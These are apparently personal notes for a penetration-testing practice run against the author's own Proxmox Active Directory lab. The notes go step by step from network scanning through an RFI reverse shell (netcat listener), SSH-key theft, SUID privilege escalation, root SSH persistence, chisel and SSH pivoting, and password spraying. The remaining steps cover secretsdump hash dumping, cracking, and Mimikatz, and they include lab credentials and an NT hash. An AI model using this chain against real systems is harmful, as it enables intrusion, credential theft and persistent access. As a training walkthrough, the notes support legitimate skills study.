## **The Environment**

I'll be operating in this environment: [https://benheater.com/hack-your-proxmox-ad-lab/](https://benheater.com/hack-your-proxmox-ad-lab/)  
Albeit, with a few additions and minor changes to the lab.

## **External**

### **Pentest Scope, Objectives, and Rules of Engagement**

**Scope**

- `10.9.9.0/24` | `cyber.range` (public facing)
- `10.80.80.0/24` | `ad.lab` (internal domain)

**Objectives**

- Own the domain

**RoE**

- Chaos, total free for all!

### **Plan of Action**

==A lot of this is going to seem a bit contrived, as I've already laid out the path to own the domain. I have only done this in the interest of time.==

**Scan the external network for IP addresses**

fping -ag 10.9.9.0/24

**Run a port scan on any live hosts**
![[Pasted image 20240104192105.png]]

**Run a port scan on any live hosts**
![[Pasted image 20240104192133.png]]


**Scavenge for any potential usernames / passwords and brute force any web servers**  
Make a note of any information and keep it in our back pocket

```
gobuster dir -u http://10.9.9.199 -w /home/ben/Pentest/Training/PJPT_Sessions/2024-Jan-04/gobuster-list.txt -x php,html,txt -r -o /home/ben/Pentest/Training/PJPT_Sessions/2024-Jan-04/gobuster-80.txt -b 403,404
```

**Get a reverse shell on the web server using RFI [using this reverse shell](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php).**

```
sudo python3 -m http.server 80
```

```
sudo rlwrap nc -lnvp 443
```

**Post-exploit enumeration borrowing bits and pieces of [my CTF methodology](https://benheater.com/my-ctf-methodology/)**  

Note the IP configuration, ARP table, Routes, Bound Ports

```
1 ip addr

2 ip neigh

3 ip route

4  netstat -plutan

```


Check for interesting files

```
1 find /home -type f 2>/dev/null
```



Make a local copy of the SSH private key and SSH in as `localuser`

```
1 cat /home/localuser/localuser_ssh_key

2 chmod 600 /home/ben/Pentest/Training/PJPT_Sessions/2024-Jan-04/localuser_ssh_key

3 ssh -i localuser_ssh_key localuser@10.9.9.199

```

Find SUID file for privilege escalation

```
1 find / -type f -user root -perm /4000 2>/dev/null
```

Escalate privileges to `root` user

```
1 /bin/bash -ip

2 id
```





Set up Persistence as the root user

```
# On Kali
ssh-keygen -t rsa -b 4096 -f /tmp/root_persistence -C "" -N ""
mv /tmp/root_persistence /home/ben/Pentest/Training/PJPT_Sessions/2024-Jan-04
# Copy the public key to clipboard
cat /tmp/root_persistence.pub
# On target with escalated privileges
echo 'public_key_string_here' >> /root/.ssh/authorized_keys
# Test private key
ssh -i /home/ben/Pentest/Training/PJPT_Sessions/2024-Jan-04/root_persistence root@10.9.9.199
```

We are on a **dual-homed** host with two interfaces on distinct subnets. Everything we have done to this point is the same regardless if this target where we've established our foothold is domain-joined or not.  
  
However, **as an added bonus**, I have joined this Linux host to my Active Directory domain and want to demonstrate some enumeration steps that can help you gather more info.

**Check if the Linux host is domain-joined and enumerate further**

```
/usr/sbin/realm list -a
/usr/sbin/adcli info <realm_domain_name>
```

Great! Looks like it is, in fact, joined to the `ad.lab` domain. Let's reference more of the [enumeration steps here](https://benheater.com/my-ctf-methodology/#:~:text=Domain%20Users%20(if%20domain%2Djoined)).

Back to the rest of the action plan...

**Set up the Reverse SOCKS Proxy Using Both [SSH](https://notes.benheater.com/books/network-pivoting/page/ssh-port-forwarding) and** [**Chisel**](https://notes.benheater.com/books/network-pivoting/page/port-forwarding-with-chisel)  
Just for demonstration purposes! You don't have to use both.

Chisel on Kali

```
wget https://github.com/jpillora/chisel/releases/download/v1.9.1/chisel_1.9.1_linux_amd64.gz -O chisel.gz
gunzip chisel.gz
chmod +x chisel
sudo ./chisel server --port 8080 --reverse -v &
```

Chisel on Target

```
wget https://github.com/jpillora/chisel/releases/download/v1.9.1/chisel_1.9.1_linux_amd64.gz ~/chisel.gz
gunzip ~/chisel.gz
chmod +x ~/chisel.gz
./chisel client 10.6.6.6:8080 R:50001:socks
```

SSH

```
ssh \
-o "UserKnownHostsFile=/dev/null" \
-o "StrictHostKeyChecking=no" \
-i root_persistence -f -N -D 127.0.0.1:50002 \
root@10.9.9.199
```


**Add Proxies to Proxychains configuration  
**Just use comments to switch between the two

```
1 sudo nano /etc/proxychains4.conf
```

**Nmap Scan through the SOCKS proxy**

```
1 sudo proxychains -q nmap -Pn -sT --top-ports 1000 -oA ad_nmap_scan 10.80.80.0/24
```

**Pass around the password of our known credential**

```
1 crackmapexec smb 10.80.80.0/24 -u 'testuser123' -p 'TestUser1!' -d ad.lab
```

**Discover that we have local admin on 10.80.80.3, so dump hashes**

```
1 impacket-secretsdump 'testuser123:TestUser1!@10.80.80.3'
```

**Note the** `Template` **user, which is a local administrator, password may be repeated**  

Notice the `Template` user's was found in the computer's SAM database  
This is where we really need to reinforce this idea of local vs network logons

```
1 crackmapexec smb 10.80.80.0/24 -u 'Template' -H 66216d8fd712c24c18dfa588cfdeca75 --local-auth
```

Have a hand at cracking the hash

```
1 echo '66216d8fd712c24c18dfa588cfdeca75' > hash

2 john --format=NT --wordlist=crack_hashes.txt hash
```

**RDP into 10.80.80.4 and transfer Mimikatz to dump LSA**

```
1 xfreerdp /proxy:socks5//127.0.0.1:50001 /v:10.80.80.4 /u:'Template' /p:'Template123!' /drive:.,kali-share +clipboard /size:90%
```

**Crack the Domain Administrator's hash**

```
1 echo 'hash_here' > da_hash

2 john --format=NT --wordlist=crack_hash.txt hash

```
## **Internal**  

### **Pentest Scope, Objectives, and Rules of Engagement**

**Scope**

- `10.80.80.0/24` | `ad.lab` (internal domain)

**Objectives**

- Own the domain  
    

**RoE**

- Chaos, total free for all!

### **Kali as a Dropbox on the Target Network**

- Largely follows the same procedure as the external just a different starting point
- Demo some of the attacks shown here